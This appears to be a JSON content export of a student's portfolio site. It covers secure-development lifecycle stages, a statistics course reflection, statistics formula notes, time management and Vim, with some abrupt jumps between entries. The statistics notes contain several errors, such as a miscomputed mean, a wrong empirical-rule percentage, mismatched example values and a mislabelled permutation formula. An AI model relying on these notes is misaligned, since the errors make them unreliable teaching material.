they see that special attention is paid to their security.\n7. Internal security improves when SDL is applied to in-house software tools.\n\n## In practice\n\nCommonly, secure programming improvement lifecycle measures are separated into the accompanying stages:\n\n###\tConcept and planning\n\nThis stage is used to define the application concept and analyze its suitability. This includes creating a task plan, writing project requirements, and assigning HR.\n\n### Architecture and design\n\nThis stage is used to plan an item that fits the requirements. This includes displaying the application's structure and usage scenarios, as well as identifying external components that can help speed up development. A plan report is the result of this stage.\n\n### Implementation\n\nThis is the point at which a true application is created. Composing the application code, debugging it, and producing stable forms suitable for testing are all part of this process.\n\n### Testing and bug fixing\n\nThis stage is used to identify and correct application errors. This includes running automated and manual tests, identifying problems, and resolving them.\n\n### Release and maintenance\n\nAn application goes live at this time, with multiple samples running in a variety of scenarios. Finally, new forms and fixes become available, and some clients opt to redesign while others stick with the more established options.\n\n### End of life\n\nThe term \"end of life\" refers to when a product's developer stops supporting it. Applications that store sensitive data may be subject to strict end-of-life guidelines.\n","readingTime":"8 min read","meta":{"version":0,"revision":0,"created":1642431877247},"$loki":14},{"slug":"minor_statistics","description":"Basic knowledge building for preparation master studies.

I would like to learn all this so I can apply it in my own projects. This will also come in handy for my follow-up study \"Data Science\" that I want to follow at the TUe. In the statistics course I will make a link with the Cyber subject by doing an analysis on Cyber related data. \nThis means I'm going to look for correlations between certain labels that have to do with, for example, malware. To show that I can apply the knowledge I have learned, I will analyze a dataset and present the data clearly and above all to people who are interested in it.\nIn order to apply statistics, a thorough knowledge of the mathematical formulas behind the analysis of these data is required. I learn this mathematics by following the course on \"Khan acandemy\". \nBy attending the lessons given by Peter Lambooij, a teacher at Fontys, I will make my knowledge measurable. During the lessons, we work on a project; we have to apply the knowledge we have learned. \nI am going to demonstrate this learning goal by showing the results and outcomes that have been released by Peter Lambooij. The results of the knowledge gained from the subject of statistics can be seen in the research. This research was conducted as a project within the subject of statistics. \n\n## Evaluate\n### Version (1)\nBelow are the results of that were obtained in the unit tests of the subject of statistics: \n\n<a href=\"/images/projects/minor/statistics/first_results.png\" target=\"_blank\" rel=\"some text\">\n  <img width=\"80%\" src=\"/images/projects/minor/statistics/first_results.png\" alt=\"First test results\"/>\n</a>\nAbove is the current status of the unit tests created for the subject of statistics. The unit tests were taken on the Khanacademy platform.  As seen above, all unit tests were passed with a minimum score of 70% or higher.  Since the workload is very high, it was difficult to keep up with all the material that was given each week. Also, the material itself was very difficult and sometimes hard to understand. During these first weeks I learned what the subject of statistics is and when and what it is used for. I also learned what static research is and the formulas that go with it by making hypotheses. \n\n[Khan academy - statistics-probability](https://www.khanacademy.org/math/statistics-probability)\n\n### Version (2)\n\nIn my previous evaluation I showed my results from the beginning to the middle of the course.

This means you will need to have quivalent subdirectory structure in you dotfiles folder so that all symoblic lniks get created in the right place. \n","readingTime":"4 min read","meta":{"version":0,"revision":0,"created":1642431877296},"$loki":16},{"slug":"other_statistic-formulas","description":"Formulas explained","title":"Statistic 1","duration":"2 whole day in total","image":"/images/projects/minor/statistics/statistics.jpg","tech":[{"name":"math"},{"name":"statistics"}],"category":[{"name":"body of knowledge"},{"name":"minor"}],"author":{"name":"Rik Peeters","image":"/images/me.jpg","social":{"twitter":"rikp777"}},"createdAt":"2021-11-19T00:00:00.000Z","toc":[{"id":"summarizing-quantitative-data","depth":2,"text":"Summarizing quantitative data"},{"id":"quantitative-data","depth":3,"text":"quantitative data"},{"id":"interquartile-range-iqr","depth":3,"text":"Interquartile range (IQR)"},{"id":"variance-and-standard-deviation-of-a-population","depth":3,"text":"Variance and standard deviation of a population"},{"id":"mean-absolute-deviation-mad","depth":3,"text":"Mean absolute deviation (MAD)"},{"id":"modeling-data-distributions","depth":2,"text":"Modeling data distributions"},{"id":"distribution","depth":3,"text":"Distribution"},{"id":"percentile-formula","depth":3,"text":"Percentile Formula"},{"id":"z-scores","depth":3,"text":"Z-scores"},{"id":"probability","depth":2,"text":"Probability"},{"id":"combinations-and-permutations","depth":2,"text":"Combinations and Permutations"},{"id":"permutations-with-repetition","depth":3,"text":"Permutations with Repetition"},{"id":"combinations-formula","depth":3,"text":"Combinations Formula"},{"id":"permutations-formula","depth":3,"text":"Permutations Formula"}],"body":{"type":"root","children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"small\nI am a visual learner so I find it hard to understand material by just reading it I have to make myself visual illustrations this has done both the khan cource for me and the many notes I have made."}]},{"type":"text","value":"\n"},{"type":"element","tag":"h1","props":{"id":"statistical-formulas"},"children":[{"type":"element","tag":"a","props":{"href":"#statistical-formulas","ariaHidden":"true","tabIndex":-1},"children":[{"type":"element","tag":"span","props":{"className":["icon","icon-link"]},"children":[]}]},{"type":"text","value":"Statistical formulas"}]},{"type":"text","value":"\n"},{"type":"element","tag":"h2","props":{"id":"summarizing-quantitative-data"},"children":[{"type":"element","tag":"a","props":{"href":"#summarizing-quantitative-data","ariaHidden":"true","tabIndex":-1},"children":[{"type":"element","tag":"span","props":{"className":["icon","icon-link"]},"children":[]}]},{"type":"text","value":"Summarizing quantitative data"}]},{"type":"text","value":"\n"},{"type":"element","tag":"h3","props":{"id":"quantitative-data"},"children":[{"type":"element","tag":"a","props":{"href":"#quantitative-data","ariaHidden":"true","tabIndex":-1},"children":[{"type":"element","tag":"span","props":{"className":["icon","icon-link"]},"children":[]}]},{"type":"text","value":"quantitative data"}]},{"type":"text","value":"\n"},{"type":"element","tag":"h4","props":{"id":"mean"},"children":[{"type":"element","tag":"a","props":{"href":"#mean","ariaHidden":"true","tabIndex":-1},"children":[{"type":"element","tag":"span","props":{"className":["icon","icon-link"]},"children":[]}]},{"type":"text","value":"Mean"}]},{"type":"text","value":"\n"},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"When you first started out in mathematics, you were probably taught that an average was a “middling” amount for a set of numbers.

You added up the numbers, divided by the number of items you can and *voila*! you get the average. For example, the average of 10, 5 and 20 is:\n\n10 + 6 + 20 = 36 / 3 = 12.\n\nThe you started studying statistics and all of a sudden the “average” is now called the mean. *What happened?* The answer is that they have the same meaning(they are synonyms).\n\n#### Mode \n\nThe mode is the value that appears most frequently in a data set. A set of data may have one mode, more than one mode, or no mode at all. Other popular measures of central tendency include the mean, or the average of a set, and the [median](https://www.investopedia.com/terms/m/median.asp), the middle value in a set.\n\n#### Median\n\nThe median is the middle number in a sorted, ascending or descending, list of numbers and can be more descriptive of that data set than the average. \n\nMedian is the middle number in a sorted list of numbers. To determine the median value in a sequence of numbers, the numbers must first be sorted, or arranged, in value order from lowest to highest or highest to lowest. The median can be used to determine an approximate average, or [mean](https://www.investopedia.com/terms/m/mean.asp), but is not to be confused with the actual mean.\n\nThe absolute middle of an ordered ascending set of numbers. \n\n### Interquartile range (IQR)\n\nWhen a data set has outliers or extreme values, we summarize a typical value using the ***median\\*** as opposed to the mean. When a data set has outliers, variability is often summarized by a statistic called the ***interquartile range\\***, which is the difference between the first and third quartiles. The first quartile, denoted Q1, is the value in the data set that holds 25% of the values *below* it. The third quartile, denoted Q3, is the value in the data set that holds 25% of the values *above* it. The quartiles can be determined following the same approach that we used to determine the median, but we now consider each half of the data set separately. \n\nIt kind of is like the mean of every 50% of the set.\n\n#### Example \n\n##### Normal\n\nSet: 62, 63, | 64 |, 64, 70, || 72, 76, | 77 |, 81,81\n\nMedian = (70 + 72) / 2 = 71\n\nMean = 71\n\nQ1 = 64\n\nQ3 = 77\n\n\n\n##### Odd number\n\nSet:  63, | 64 , 64 |, 70, | 72 |, 76, | 77, 81 | ,81\n\nMedian = 72\n\nMean = 72\n\nQ1 = (64 + 64) / 2 = 64\n\nQ3 = (77 + 81) / 2 = 79\n\n### Variance and standard deviation of a population\n\nInterestingly, in the real world no statistician would ever calculate standard deviation by hand. The calculations involved are somewhat complex, and the risk of making a mistake is high. Also, calculating by hand is slow. Very slow. This is why statisticians rely on spreadsheets and computer programs to crunch their numbers.\n\n#### Population\n\nThe formula for standard deviation (SD) is:\n\n<img src=\"https://latex.codecogs.com/svg.latex?\\color{Magenta}\\Large&space;\\text{SD} /= \\sqrt{\\dfrac{\\sum\\limits_{}^{}{{\\lvert x- \\mu \\rvert^2}}}{N}}\" title=\"formula\" />\n\nwhere ∑ sum means \"sum of\", x is a value in the data set, μ is the mean of the data set, and *N* is the number of data points in the population.\n\nThe standard deviation formula may look confusing, but it will make sense after we break it down. In the coming sections, we'll walk through a step-by-step interactive example. Here's a quick preview of the steps we're about to follow:\n\n#### Sample\n\nThe formula above is for finding the standard deviation of a population. If you're dealing with a sample, you'll want to use a slightly different formula (below), which uses n-1,  instead of *N*. \n\n<img src=\"https://latex.codecogs.com/svg.latex?\\color{Magenta}\\Large&space;\\text{SD} = \\sqrt{\\dfrac{\\sum\\limits_{}^{}{{\\lvert x- \\bar{x} \\rvert^2}}}{n -1}}\" title=\"formula\" />\n\n\n\n### Mean absolute deviation (MAD)\n\nThe mean absolute deviation of a dataset is the average distance between each data point and the mean. It gives us an idea about the variability in a dataset.\n\nHere's how to calculate the mean absolute deviation.\n\n**Step 1:** Calculate the mean.\n\n**Step 2:** Calculate how far away each data point is from the mean using positive distances. These are called absolute deviations.\n\n**Step 3:** Add those deviations together.\n\n**Step 4:** Divide the sum by the number of data points.\n\nFollowing these steps in the example below is probably the best way to learn about mean absolute deviation, but here is a more formal way to write the steps in a formula:\n\n<img src=\"https://latex.codecogs.com/svg.latex?\\color{Magenta}\\Large&space;\\text{MAD} = \\dfrac{\\sum\\limits_{}^{}{{\\lvert x_{i}- \\bar{x} \\rvert}}}{n}\" title=\"formula\" />\n\n\n\n## Modeling data distributions\n\n### Distribution\n\n#### Normal\n\nThe normal distribution is the most common type of distribution assumed in technical stock market analysis and in other types of statistical analyses. The standard normal distribution has two parameters: the mean and the [standard deviation](https://www.investopedia.com/terms/s/standarddeviation.asp). For a normal distribution, 68% of the observations are within +/- one standard deviation of the mean, 95% are within +/- two standard deviations, and 99.7% are within +- three standard deviations.\n\n##### Empirical rule \n\nIn statistics, the empirical rule states that 99.7% of data occurs within three standard deviations of the mean within a normal distribution. To this end, 68% of the observed data will occur within the first standard deviation, 95% will take place in the second deviation, and 97.5% within the third standard deviation. The empirical rule predicts the probability distribution for a set of outcomes. \n\nThe empirical rule is applied to anticipate probable outcomes in a normal distribution. For instance, a statistician would use this to estimate the percentage of cases that fall in each standard deviation. Consider that the standard deviation is 3.1 and the mean equals 10. In this case, the first standard deviation would range between (10+3.2)= 13.2 and (10-3.2)= 6.8. The second deviation would fall between 10 + (2 X 3.2)= 16.4 and 10 - (2 X 3.2)= 3.6, and so forth. \n\n#### Skewness\n\n##### Left\n\nA **[left-skewed distribution](https://www.statisticshowto.com/probability-and-statistics/skewed-distribution/#SkewLeft)** has a long left tail. Left-skewed distributions are also called *negatively-skewed* distributions. That’s because there is a [long tail](https://www.statisticshowto.com/long-tail-distribution/) in the negative direction on the number line. The mean is also to the left of the [peak](https://www.statisticshowto.com/peak-of-a-distribution/).\n\nIn most cases, the [mean ](https://www.statisticshowto.com/probability-and-statistics/statistics-definitions/mean-median-mode/#mean)is to the left of the median. This isn’t a reliable test for skewness though, as some distributions (i.e. many [multimodal distributions](https://www.statisticshowto.com/multimodal-distribution/)) violate this rule. You should think of this as a “general idea” kind of rule, and not a set-in-stone one.\n\n##### Right\n\nA **[right-skewed distribution](https://www.statisticshowto.com/probability-and-statistics/skewed-distribution/#SkewRight)** has a long right tail. Right-skewed distributions are also called positive-skew distributions. That’s because there is a long tail in the positive direction on the number line. The [mean ](https://www.statisticshowto.com/probability-and-statistics/statistics-definitions/mean-median-mode/#mean)is also to the right of the peak.\n\nOn a right-skewed histogram, the mean, median, and mode are all different. In this case, the mode is the highest point of the histogram, whereas the median and mean fall to the right of it (or, visually, the right of the peak). Note that [the mean will *always* be to the right of the median](http://www.statisticshowto.com/skewed-distribution/).\n\n### Percentile Formula\n\n**Percentile = (Number of Values Below “x” / Total Number of Values) × 100**\n\nP = (n/N) × 100\n\nWhere, \n\n- n = ordinal rank of the given value or value below the number\n- N = number of values in the data set \n- P = percentile \n\nOr \n\nPercentile = (Number of Values Below “x” / Total Number of Values) × 100\n\n### Z-scores\n\n**Simply put, a z-score (also called a \\*standard score\\*) gives you an idea of how far from the [mean](https://www.statisticshowto.com/probability-and-statistics/statistics-definitions/mean-median-mode/) a data point is.** But more technically it’s a measure of how many [standard deviations](https://www.statisticshowto.com/probability-and-statistics/standard-deviation/) below or above the [population mean ](https://www.statisticshowto.com/population-mean/)a [raw score](https://www.statisticshowto.com/raw-score/) is.\n\nA z-score can be placed on a [**normal distribution**](https://www.statisticshowto.com/probability-and-statistics/normal-distributions/) curve. Z-scores range from -3 standard deviations (which would fall to the far left of the normal distribution curve) up to +3 standard deviations (which would fall to the far right of the normal distribution curve). In order to use a z-score, you need to know the [mean](https://www.statisticshowto.com/probability-and-statistics/statistics-definitions/mean-median-mode/#mean) μ and also the population standard deviation σ.\n\n#### Bases \n\nSimply put, a z-score (also called a standard score) gives an idea of how far away it is from the mean value of a data point. More technically, it is a measure of the number of standard deviations below or above the given population that signify a raw score.\n\nDe basis z-scoreformule voor een steekproef is:\n\nz = (x – μ) / σ\n\nwhere:\n\n- **x:** individual data value\n- **μ:** population mean\n- **σ:** population standard deviation\n\nA z-score for an individual value can be interpreted as follows:\n\n- **Positive z-score:** The individual value is greater than the mean.\n- **Negative z-score:** The individual value is less than the mean.\n- **A z-score of 0:** The individual value is equal to the mean.\n\n##### Example\n\nFor example, let's say you have a test score of 190. The test has a mean (μ) of 150 and a standard deviation (σ) of 25. Assuming a normal distribution, your z score would be:\n\nz = (x – μ) / σ\n\n= 190 – 150 / 25 = 1.6.\n\nThe z-score tells you as many standard deviations from the mean of your score. In this example, your score is 1.6 standard deviations above the mean.\n\n#### Standard error of the mean\n\nIf you have multiple samples and want to describe the standard deviation of those samples (the standard deviation), you would use this z-score formula:\n\nz = (x – μ) / (σ / √n)\n\nThis z-score tells you that there are many standard errors between the sample mean and the population mean.\n\n##### Example\n\nIn general, the average height of women is 65″ with a standard deviation of 3.5″. What is the probability of finding a random sample of 50 women with a mean height of 70″, assuming the heights are normally distributed?\n\nz = (x – μ) / (σ / √n)\n\n= (70 – 65) / (3.5/√50) = 5 / 0.495 = 10.1\n\n## Probability\n\nRandomness is all around us. Probability theory is the mathematical framework that allows us to analyze chance events in a logically sound manner. The probability of an event is a number indicating how likely that event will occur. This number is always between 0 and 1, where 0 indicates impossibility and 1 indicates certainty.\n\nA classic example of a probabilistic experiment is a fair coin toss, in which the two possible outcomes are heads or tails. In this case, the probability of flipping a head or a tail is 1/2. In an actual series of coin tosses, we may get more or less than exactly 50% heads. But as the number of flips increases, the long-run frequency of heads is bound to get closer and closer to 50%.\n\n<img src=\"https://latex.codecogs.com/svg.latex?\\color{Magenta}\\Large&space;P(E)=\\sum _{x\\in E}f(x)\\,.\" title=\"formula\" />\n\n\n\n```P(A) = (# of ways A can happen) / (Total number of outcomes)```\n\n- The probability of an event can only be between 0 and 1 and can also be written as a percentage or fraction.\n- The probability of event *A* is often written as ```P(A)```.\n- If ```P(A) > P(B)```,  then event *A* has a higher chance of occurring than event *B*.\n- If ```P(A) = P(B)```, then events *A* and *B* are equally likely to occur.\n\n## Combinations and Permutations\n\nThe difference between combinations and permutations is ordering. **With permutations we care about the order of the elements, whereas with combinations we don’t.**\n\nFor example, say your locker “combo” is 5432. If you enter 4325 into your locker it won’t open because it is a different ordering (aka permutation).\n\nThe **permutations** of 2, 3, 4, 5 are:\n\n- **5432,** 5423, 5324, 5342, 5234, 5243, 4532, 4523, 4325, 4352, 4253, 4235, 3542, 3524, 3425, 3452, 3254, 3245, 2543, 2534, 2435, 2453, 2354, 2345\n\n  24 combinations\n\nYour locker “combo” is a specific permutation of 2, 3, 4 and 5. If your locker worked truly by combination, you could enter any of the above permutations and it would open!\n\nSuppose you want to know how many permutations exist of the numbers 2, 3, 4, 5 without listing them like I did above. How would you accomplish this?\n\nUsing the *Multiplication Principle of combinatorics,* we know that if there are *x* ways of doing one thing and *y* ways of doing another, then the total number of ways of doing both things is *x•y*. That means we need to multiply to find the total permutations.\n\nThis is a great opportunity to use shorthand **factorial notation (!)**:\n\n4! = 4*•*3*•*2*•*1 = 24\n\nThere are 24 permutations, which matches the listing we made at the beginning of this post.\n\n### Permutations with Repetition\n\nWhat if I wanted to find the total number of permutations involving the numbers 2, 3, 4, and 5 but want to include orderings such as 5555 or 2234 where not all of the numbers are used, and some are used more than once?\nHow many of these permutations exist?\nThis turns out to be a simple calculation. Again we are composing a 4-digit number, so draw 4 lines to represent the digits.\n\n4•4•4•4 = 4^4 = 256\n\n### Combinations Formula\n\nIf we have *n* objects and we want to choose *k* of them*,* we can find the total number of combinations by using the following formula:\n\n<img src=\"https://latex.codecogs.com/svg.latex?\\color{Magenta}\\Large&space;(\\dfrac{n}{k}) = \\dfrac{n!}{k!(n-k)!}\" title=\"formula\" />\n\nFor example, we have 52 cards (n=52) and want to know how many 5-card hands (k=5) we can make.\n\nPlugging in the values we get:\n\n<img src=\"https://latex.codecogs.com/svg.latex?\\color{Magenta}\\Large&space;(\\dfrac{52}{5}) = \\dfrac{52!}{5!(52-5)!}\" title=\"formula\" />\n\n### Permutations Formula\n\nThe formula for permutations is similar to the combinations formula, except we needn’t divide out the permutations, so we can remove k! from the denominator:\n\n<img src=\"https://latex.codecogs.com/svg.latex?\\color{Magenta}\\Large&space;(\\dfrac{n}{k}) = \\dfrac{n!}{(n-k)!}\" title=\"formula\" />\n\n\n\nsources: \n\n[datascience.eu](https://datascience.eu/nl/wiskunde-statistiek/wat-is-een-z-score/)\n\n[Khan Academy](https://www.khanacademy.org/math/statistics-probability)\n\n[investopedia](https://www.investopedia.com/terms/n/normaldistribution.asp)\n\n[statology](https://www.statology.org/comparing-z-scores/)\n\n[investopedia](https://www.investopedia.com/terms/e/empirical-rule.asp)\n\n[sphweb.bumc.bu.edu](https://sphweb.bumc.bu.edu/otlt/mph-modules/bs/bs704_summarizingdata/bs704_summarizingdata7.html)\n\n[medium](https://medium.com/i-math/combinations-permutations-fa7ac680f0ac)\n\n[seeing-theory.brown.edu](https://seeing-theory.brown.edu/basic-probability/index.html)\n","dir":"/projects/other","path":"/projects/other/statistic-formulas","extension":".md","updatedAt":"2022-01-17T15:02:36.882Z","bodyPlainText":"small\nI am a visual learner so I find it hard to understand material by just reading it I have to make myself visual illustrations this has done both the khan cource for me and the many notes I have made. \n\n# Statistical formulas\n\n## Summarizing quantitative data\n\n### quantitative data\n\n#### Mean\n\nWhen you first started out in mathematics, you were probably taught that an average was a “middling” amount for a set of numbers. You added up the numbers, divided by the number of items you can and *voila*! you get the average. For example, the average of 10, 5 and 20 is:\n\n10 + 6 + 20 = 36 / 3 = 12.\n\nThe you started studying statistics and all of a sudden the “average” is now called the mean. *What happened?* The answer is that they have the same meaning(they are synonyms).\n\n#### Mode \n\nThe mode is the value that appears most frequently in a data set. A set of data may have one mode, more than one mode, or no mode at all. Other popular measures of central tendency include the mean, or the average of a set, and the [median](https://www.investopedia.com/terms/m/median.asp), the middle value in a set.\n\n#### Median\n\nThe median is the middle number in a sorted, ascending or descending, list of numbers and can be more descriptive of that data set than the average. \n\nMedian is the middle number in a sorted list of numbers. To determine the median value in a sequence of numbers, the numbers must first be sorted, or arranged, in value order from lowest to highest or highest to lowest. The median can be used to determine an approximate average, or [mean](https://www.investopedia.com/terms/m/mean.asp), but is not to be confused with the actual mean.\n\nThe absolute middle of an ordered ascending set of numbers. \n\n### Interquartile range (IQR)\n\nWhen a data set has outliers or extreme values, we summarize a typical value using the ***median\\*** as opposed to the mean. When a data set has outliers, variability is often summarized by a statistic called the ***interquartile range\\***, which is the difference between the first and third quartiles. The first quartile, denoted Q1, is the value in the data set that holds 25% of the values *below* it. The third quartile, denoted Q3, is the value in the data set that holds 25% of the values *above* it. The quartiles can be determined following the same approach that we used to determine the median, but we now consider each half of the data set separately. \n\nIt kind of is like the mean of every 50% of the set.\n\n#### Example \n\n##### Normal\n\nSet: 62, 63, | 64 |, 64, 70, || 72, 76, | 77 |, 81,81\n\nMedian = (70 + 72) / 2 = 71\n\nMean = 71\n\nQ1 = 64\n\nQ3 = 77\n\n\n\n##### Odd number\n\nSet:  63, | 64 , 64 |, 70, | 72 |, 76, | 77, 81 | ,81\n\nMedian = 72\n\nMean = 72\n\nQ1 = (64 + 64) / 2 = 64\n\nQ3 = (77 + 81) / 2 = 79\n\n### Variance and standard deviation of a population\n\nInterestingly, in the real world no statistician would ever calculate standard deviation by hand. The calculations involved are somewhat complex, and the risk of making a mistake is high. Also, calculating by hand is slow. Very slow. This is why statisticians rely on spreadsheets and computer programs to crunch their numbers.\n\n#### Population\n\nThe formula for standard deviation (SD) is:\n\n<img src=\"https://latex.codecogs.com/svg.latex?\\color{Magenta}\\Large&space;\\text{SD} /= \\sqrt{\\dfrac{\\sum\\limits_{}^{}{{\\lvert x- \\mu \\rvert^2}}}{N}}\" title=\"formula\" />\n\nwhere ∑ sum means \"sum of\", x is a value in the data set, μ is the mean of the data set, and *N* is the number of data points in the population.\n\nThe standard deviation formula may look confusing, but it will make sense after we break it down.

The second deviation would fall between 10 + (2 X 3.2)= 16.4 and 10 - (2 X 3.2)= 3.6, and so forth. \n\n#### Skewness\n\n##### Left\n\nA **[left-skewed distribution](https://www.statisticshowto.com/probability-and-statistics/skewed-distribution/#SkewLeft)** has a long left tail. Left-skewed distributions are also called *negatively-skewed* distributions. That’s because there is a [long tail](https://www.statisticshowto.com/long-tail-distribution/) in the negative direction on the number line.

In this case, the mode is the highest point of the histogram, whereas the median and mean fall to the right of it (or, visually, the right of the peak). Note that [the mean will *always* be to the right of the median](http://www.statisticshowto.com/skewed-distribution/).\n\n### Percentile Formula\n\n**Percentile = (Number of Values Below “x” / Total Number of Values) × 100**\n\nP = (n/N) × 100\n\nWhere, \n\n- n = ordinal rank of the given value or value below the number\n- N = number of values in the data set \n- P = percentile \n\nOr \n\nPercentile = (Number of Values Below “x” / Total Number of Values) × 100\n\n### Z-scores\n\n**Simply put, a z-score (also called a \\*standard score\\*) gives you an idea of how far from the [mean](https://www.statisticshowto.com/probability-and-statistics/statistics-definitions/mean-median-mode/) a data point is.** But more technically it’s a measure of how many [standard deviations](https://www.statisticshowto.com/probability-and-statistics/standard-deviation/) below or above the [population mean ](https://www.statisticshowto.com/population-mean/)a [raw score](https://www.statisticshowto.com/raw-score/) is.\n\nA z-score can be placed on a [**normal distribution**](https://www.statisticshowto.com/probability-and-statistics/normal-distributions/) curve.

The test has a mean (μ) of 150 and a standard deviation (σ) of 25. Assuming a normal distribution, your z score would be:\n\nz = (x – μ) / σ\n\n= 190 – 150 / 25 = 1.6.\n\nThe z-score tells you as many standard deviations from the mean of your score. In this example, your score is 1.6 standard deviations above the mean.\n\n#### Standard error of the mean\n\nIf you have multiple samples and want to describe the standard deviation of those samples (the standard deviation), you would use this z-score formula:\n\nz = (x – μ) / (σ / √n)\n\nThis z-score tells you that there are many standard errors between the sample mean and the population mean.\n\n##### Example\n\nIn general, the average height of women is 65″ with a standard deviation of 3.5″. What is the probability of finding a random sample of 50 women with a mean height of 70″, assuming the heights are normally distributed?\n\nz = (x – μ) / (σ / √n)\n\n= (70 – 65) / (3.5/√50) = 5 / 0.495 = 10.1\n\n## Probability\n\nRandomness is all around us.

In this case, the probability of flipping a head or a tail is 1/2. In an actual series of coin tosses, we may get more or less than exactly 50% heads. But as the number of flips increases, the long-run frequency of heads is bound to get closer and closer to 50%.\n\n<img src=\"https://latex.codecogs.com/svg.latex?\\color{Magenta}\\Large&space;P(E)=\\sum _{x\\in E}f(x)\\,.\" title=\"formula\" />\n\n\n\n```P(A) = (# of ways A can happen) / (Total number of outcomes)```\n\n- The probability of an event can only be between 0 and 1 and can also be written as a percentage or fraction.\n- The probability of event *A* is often written as ```P(A)```.\n- If ```P(A) > P(B)```,  then event *A* has a higher chance of occurring than event *B*.\n- If ```P(A) = P(B)```, then events *A* and *B* are equally likely to occur.\n\n## Combinations and Permutations\n\nThe difference between combinations and permutations is ordering. **With permutations we care about the order of the elements, whereas with combinations we don’t.**\n\nFor example, say your locker “combo” is 5432. If you enter 4325 into your locker it won’t open because it is a different ordering (aka permutation).\n\nThe **permutations** of 2, 3, 4, 5 are:\n\n- **5432,** 5423, 5324, 5342, 5234, 5243, 4532, 4523, 4325, 4352, 4253, 4235, 3542, 3524, 3425, 3452, 3254, 3245, 2543, 2534, 2435, 2453, 2354, 2345\n\n  24 combinations\n\nYour locker “combo” is a specific permutation of 2, 3, 4 and 5. If your locker worked truly by combination, you could enter any of the above permutations and it would open!\n\nSuppose you want to know how many permutations exist of the numbers 2, 3, 4, 5 without listing them like I did above. How would you accomplish this?\n\nUsing the *Multiplication Principle of combinatorics,* we know that if there are *x* ways of doing one thing and *y* ways of doing another, then the total number of ways of doing both things is *x•y*. That means we need to multiply to find the total permutations.\n\nThis is a great opportunity to use shorthand **factorial notation (!)**:\n\n4! = 4*•*3*•*2*•*1 = 24\n\nThere are 24 permutations, which matches the listing we made at the beginning of this post.\n\n### Permutations with Repetition\n\nWhat if I wanted to find the total number of permutations involving the numbers 2, 3, 4, and 5 but want to include orderings such as 5555 or 2234 where not all of the numbers are used, and some are used more than once?\nHow many of these permutations exist?\nThis turns out to be a simple calculation. Again we are composing a 4-digit number, so draw 4 lines to represent the digits.\n\n4•4•4•4 = 4^4 = 256\n\n### Combinations Formula\n\nIf we have *n* objects and we want to choose *k* of them*,* we can find the total number of combinations by using the following formula:\n\n<img src=\"https://latex.codecogs.com/svg.latex?\\color{Magenta}\\Large&space;(\\dfrac{n}{k}) = \\dfrac{n!}{k!(n-k)!}\" title=\"formula\" />\n\nFor example, we have 52 cards (n=52) and want to know how many 5-card hands (k=5) we can make.\n\nPlugging in the values we get:\n\n<img src=\"https://latex.codecogs.com/svg.latex?\\color{Magenta}\\Large&space;(\\dfrac{52}{5}) = \\dfrac{52!}{5!(52-5)!}\" title=\"formula\" />\n\n### Permutations Formula\n\nThe formula for permutations is similar to the combinations formula, except we needn’t divide out the permutations, so we can remove k! from the denominator:\n\n<img src=\"https://latex.codecogs.com/svg.latex?\\color{Magenta}\\Large&space;(\\dfrac{n}{k}) = \\dfrac{n!}{(n-k)!}\" title=\"formula\" />\n\n\n\nsources: \n\n[datascience.eu](https://datascience.eu/nl/wiskunde-statistiek/wat-is-een-z-score/)\n\n[Khan Academy](https://www.khanacademy.org/math/statistics-probability)\n\n[investopedia](https://www.investopedia.com/terms/n/normaldistribution.asp)\n\n[statology](https://www.statology.org/comparing-z-scores/)\n\n[investopedia](https://www.investopedia.com/terms/e/empirical-rule.asp)\n\n[sphweb.bumc.bu.edu](https://sphweb.bumc.bu.edu/otlt/mph-modules/bs/bs704_summarizingdata/bs704_summarizingdata7.html)\n\n[medium](https://medium.com/i-math/combinations-permutations-fa7ac680f0ac)\n\n[seeing-theory.brown.edu](https://seeing-theory.brown.edu/basic-probability/index.html)\n","readingTime":"12 min read","meta":{"version":0,"revision":0,"created":1642431877368},"$loki":17},{"slug":"other_time-management","description":"How to manage time and make priorities","id":null,"title":"Time Management -            plangroup. student+","duration":"1 whole day in total","image":"/images/projects/minor/time-management.png","tech":[{"name":"time management"}],"category":[{"name":"body of knowledge"},{"name":"minor"}],"author":{"name":"Rik Peeters","image":"/images/me.jpg","social":{"twitter":"rikp777"}},"createdAt":"2021-11-10T00:00:00.000Z","toc":[{"id":"eisenhower-model","depth":2,"text":"Eisenhower model"},{"id":"urgent-as-well-as-important-do-it","depth":3,"text":"Urgent as well as important.

Vim (IDE)\n\nThere's a reason why, after decades, countless developers still prefer Vim as their code editor of choice. That many people can't be wrong, right? Vim is a  free open source software. My first experience with Vim was when I accidentally entered it and could not get out. I had to google [how to exit vim](https://stackoverflow.com/questions/11828270/how-do-i-exit-the-vim-editor) to escape. I asked, *\"why would anyone ever use this awful editor?\"* Fast forward 4 years, this awful editor is now my primary editor. I've tried editors like *Notepad++, Atom, Intellij and VSCode*\n\nThis semester enabled me to make the switch to this environment. This did not work out last semester because there is a very intensive learning curve to learning vim. \n\nI think a great editor needs to have these three features:\n\n- Extensibility\n- Community\n- Composability\n- Intelligent code completion\n\nVim is what I use because it has all four of the capabilities listed above. Allow me to explain each one.\n\n## Extensibility\n\nIf you've used VSCode, Atom, or Sublime, then you know being able to add and remove plugins easily is an indispensable feature. This functionality is also provided by vim but that's not all because vim allows you to choose your own plugin manager according to your needs. In my environment I use packer. \n\n## Community\n\nIn open source technology, the community is very crucial. As long as there are enough contributing developers, a vibrant community assures continual development and problem fixes. More community plugins, tutorials, and human help are all part of the equation. The Vim community is quite active. It has a reddit page, a stackexchange account, and a number of specialized twitter accounts, among other things. I personally learned a lot from the vim master ThePrimeagen on youtube and twitch.\n\n## Composability\n\nIn addition to extensibility and community, Vim features composability, which I believe is a trait that many non-modal editors lack.\n\nCompo..what?\n\nComposability refers to the ability to combine a set of generic instructions to achieve more complicated tasks. In the same way that you can make complicated abstractions out of smaller abstractions in programming, you can run complex commands out of simpler ones in Vim. Vim contains movement motions and editing operators (there are also text objects, but I won't go over them here).\n\n## Intelligent code completion\n\nIntelligent code completion is a context-aware code completion function in various programming environments that reduces typos and other typical errors to speed up the writing process. Attempts at this are often made by using auto-completion popups while typing, querying function arguments, and query tips for syntax mistakes. Reflection is used to provide documentation and disambiguation for variable names, functions, and methods utilizing intelligent code completion and associated technologies. also for this complexity, vim has several plugins that can support you with this. \n\n# Learning curve\n\nit's not a curve it's a wall, but if you break it you'll earn your geekhood!\n\nIf you use vim all day and make an effort to use it well, you’ll be editing code faster than you did in your old editor within two weeks. Learning vim is like this. At first, you do everything as simply as possible. Then you start to wonder if there are faster ways to get things done, and there are! If you chain those commands together they just work! You bump into things 